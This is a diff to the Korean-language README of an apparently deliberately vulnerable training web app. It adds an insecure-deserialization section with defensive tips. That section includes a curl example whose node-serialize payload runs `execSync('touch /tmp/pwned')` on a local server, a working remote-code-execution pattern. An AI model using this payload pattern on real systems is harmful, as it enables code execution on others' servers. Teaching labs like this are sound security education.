@@ -204,6 +204,26 @@ curl -X PUT "http://localhost:3000/api/vulnerable/update-profile?userId=1" \
 - 민감한 필드 업데이트 금지
 - DTO (Data Transfer Object) 패턴 사용
 
+### 10. Insecure Deserialization
+신뢰할 수 없는 데이터를 역직렬화하여 원격 코드 실행이 가능한 취약점
+
+**엔드포인트:**
+- `POST /api/vulnerable/deserialize`
+
+**테스트 예제:**
+```bash
+# 원격 코드 실행 (RCE) 페이로드
+# 서버의 /tmp 디렉토리에 'pwned' 파일 생성
+curl -X POST http://localhost:3000/api/vulnerable/deserialize \
+  -H "Content-Type: application/json" \
+  -d '{"data": "{\\"username\\":\\"pwned\\",\\"_is_serialized\\":true,\\"payload\\":\\"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'touch /tmp/pwned\')}()\\"}"}'
+```
+
+**방어 방법:**
+- 신뢰할 수 없는 소스의 데이터는 역직렬화하지 않음
+- JSON과 같이 더 안전하고 표준적인 데이터 교환 포맷 사용
+- 역직렬화 시 데이터 무결성 검증 (예: 서명 확인)
+
 ## 📚 학습 가이드
 
 ### 1. 각 취약점 이해하기
@@ -226,6 +246,7 @@ curl -X PUT "http://localhost:3000/api/vulnerable/update-profile?userId=1" \
 - SQLite (in-memory database)
 - Swagger UI Express
 - Cookie Parser
+- node-serialize
 
 ## 📖 추천 학습 자료
 
